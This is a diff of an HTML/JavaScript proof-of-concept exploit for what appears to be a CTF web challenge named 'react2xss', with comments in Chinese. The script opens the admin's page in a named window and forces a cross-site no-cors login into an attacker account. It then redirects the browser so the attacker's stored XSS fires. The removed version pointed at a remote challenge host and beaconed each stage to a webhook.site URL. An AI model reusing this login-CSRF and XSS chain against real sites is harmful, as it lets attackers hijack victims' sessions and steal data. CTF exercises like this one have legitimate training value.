@@ -1,57 +1,34 @@
 <!doctype html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>react2xss</title>
-</head>
-<body>
-loading...
+<meta charset="utf-8">
+<title>poc</title>
 <script>
-const APP = 'http://chal.polyuctf.com:46605';
-const HOOK = 'https://webhook.site/b3200547-ba91-46b8-acc1-ec4381a2fcb3';
-const USER = 'admin123';
-const PASS = 'admin12345';
+const USER = 'aaaabbbb';
+const PASS = 'aaaabbbbcc';
+const LOCAL = 'http://localhost:3000';
 
-const ping = (q) => {
-  new Image().src = HOOK + '/?' + q + '&ts=' + Date.now();
-};
+// 第一步：先把 admin 的主页留在命名窗口里
+window.open(`${LOCAL}/`, 'flagwin');
 
-ping('stage=gh_loaded');
+// 第二步：把当前会话切成你的账号
+setTimeout(async () => {
+  try {
+    await fetch(`${LOCAL}/api/auth/login`, {
+      method: 'POST',
+      mode: 'no-cors',
+      credentials: 'include',
+      headers: {
+        'Content-Type': 'text/plain'
+      },
+      body: JSON.stringify({
+        username: USER,
+        password: PASS
+      })
+    });
+  } catch (e) {}
 
-try {
-  window.open(APP + '/api/profile', 'victim');
-  ping('stage=victim_opened');
-} catch (e) {
-  ping('stage=victim_open_err&d=' + encodeURIComponent(String(e)));
-}
-
-const creds = JSON.stringify({ username: USER, password: PASS });
-
-function relogin(tag) {
-  return fetch(APP + '/api/auth/login', {
-    method: 'POST',
-    mode: 'no-cors',
-    credentials: 'include',
-    headers: {
-      'Content-Type': 'text/plain;charset=UTF-8'
-    },
-    body: creds
-  }).then(() => {
-    ping('stage=' + tag);
-  }).catch((e) => {
-    ping('stage=' + tag + '_err&d=' + encodeURIComponent(String(e)));
-  });
-}
-
-setTimeout(() => relogin('relogin1'), 700);
-setTimeout(() => relogin('relogin2'), 1200);
-setTimeout(() => relogin('relogin3'), 1700);
-setTimeout(() => relogin('relogin4'), 2300);
-
-setTimeout(() => {
-  ping('stage=go_home');
-  location = APP + '/';
-}, 3200);
+  // 第三步：当前页跳到你的主页，触发你自己的 stored XSS
+  setTimeout(() => {
+    location = `${LOCAL}/`;
+  }, 1200);
+}, 1500);
 </script>
-</body>
-</html>
